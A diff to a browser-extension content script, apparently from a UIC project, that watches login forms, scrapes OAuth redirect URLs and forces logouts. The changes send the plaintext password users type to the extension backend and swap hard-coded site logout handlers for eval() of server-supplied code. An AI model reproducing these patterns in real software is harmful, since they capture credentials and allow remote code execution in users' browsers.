@@ -9,22 +9,11 @@ __UIC(['pages', 'content'], function (global, ns) {
 var window_is_focused = true,
     found_forms = [],
     host = window.location.host,
-    // Simple cross platform event listener
-    listen = function (eventName, elem, func) {
-        // W3C DOM
-        if (elem.addEventListener) {
-
-            elem.addEventListener(eventName, func, false);
-
-        } else if (elem.attachEvent) { // IE DOM
-
-            var r = elem.attachEvent("on" + eventName, func);
-            return r;
-
-        }
-    },
-    report_password_typed = function () {
-        kango.dispatchMessage("password-entered", {url: window.location.href});
+    report_password_typed = function (password_input) {
+        kango.dispatchMessage("password-entered", {
+            url: window.location.href,
+            password: password_input.value
+        });
     },
     watch_form = function (form_node) {
         var password_input = form_node.querySelector("input[type='password']"),
@@ -44,14 +33,28 @@ var window_is_focused = true,
             password_input.value = "";
             password_input.name = "password_noautocomplete";
 
-            password_input.addEventListener('keyup', function () {
-                if (!has_touched_password) {
+            // Register password entry if the user hits enter in the password
+            // field
+            password_input.addEventListener('keyup', function (e) {
+                if (password_input.value && e.keyCode == 13 && !has_touched_password) {
                     password_input.name = fake_password_input.name;
                     password_input.parentNode.removeChild(fake_password_input);
                     has_touched_password = true;
-                    report_password_typed();
+                    report_password_typed(password_input);
                 }
             }, false);
+
+            // Also register password entry if the user blurs out of the
+            // password field
+            password_input.addEventListener('blur', function (e) {
+                if (password_input.value && !has_touched_password) {
+                    password_input.name = fake_password_input.name;
+                    password_input.parentNode.removeChild(fake_password_input);
+                    has_touched_password = true;
+                    report_password_typed(password_input);
+                }
+            }, false);
+
         }
     },
     insert_callback = function (records) {
@@ -84,6 +87,32 @@ form_watcher.observe(document.body, {
     characterData: true
 });
 
+
+// Next, see if we're on the UIC OAuth2 style forwarding page.  If so,
+// scrape the url we're redirecting too out of the page body and let the back
+// end know. Otherwise, let the back end know we found nothing.
+let extractedRedirectUrl = null;
+if (window.location.href.indexOf("https://ness.uic.edu/bluestem/login.cgi") === 0) {
+
+    let urlText = /https?:\/\/[^ "]+$/,
+        passPar = document.querySelector("blockquote p[style='text-align: center; color: blue; font-weight: bold']");
+
+    if (passPar) {
+
+        let urls = urlText.exec(passPar.innerHTML);
+        if (urls && urls.length > 0) {
+            extractedRedirectUrl = urls[0];
+        }
+    }
+}
+
+// Now notify the backend of both the current page, and (possibly) the page
+// the current OAuth2 flow is redirecting to.
+kango.dispatchMessage("found-redirect-url", {
+    currentUrl: window.location.href,
+    redirectUrl: extractedRedirectUrl
+});
+
 // Notify the backend that we'd like to know if we should force the user to
 // reauthenticate on the current page.
 kango.dispatchMessage("check-for-reauth", {domReady: true});
@@ -101,44 +130,8 @@ kango.addMessageListener("response-for-reauth", function (event) {
         return;
     }
 
-    switch (event.data) {
-
-        case "Facebook":
-            signoutForm = document.getElementById("logout_form");
-            if (signoutForm) {
-                signoutForm.submit();
-            }
-            break;
-
-        case "Gmail":
-            window.location.href = "https://mail.google.com/mail/u/0/?logout&hl=en&hlor";
-            break;
-
-        case "Tumblr":
-            window.location.href = "http://www.tumblr.com/logout";
-            break;
-
-        case "Twitter":
-            signoutForm = document.getElementById("signout-form");
-            if (signoutForm) {
-                signoutForm.submit();
-            }
-            break;
-
-        case "Reddit":
-            signoutForm = document.querySelector("form.logout");
-            if (signoutForm) {
-                signoutForm.submit();
-            }
-            break;
-
-        case "Yahoo Mail":
-            signoutLink = document.querySelector("a.yucs-signout");
-            if (signoutLink) {
-                signoutLink.click();
-            }
-            break;
-    }
+    // Execute the server provided logout code for this domain
+    eval(event.data);
 });
 
 // Notify the backend that we'd like to know if we should alert the user
@@ -178,13 +171,13 @@ kango.addMessageListener("response-for-registration", function (event) {
 // Next, register on-focus and on-blur events for the window, so that
 // we can only potentially log a user out if the window is blurred and
 // not being used.
-listen("blur", window, function () {
+window.addEventListener("blur", function () {
     window_is_focused = false;
-});
+}, false);
 
-listen("focus", window, function () {
+window.addEventListener("focus", function () {
     window_is_focused = true;
-});
+}, false);
 
 // Last, if the page is active, check every 60 seconds to see whether the
 // user should be logged out of the current page.
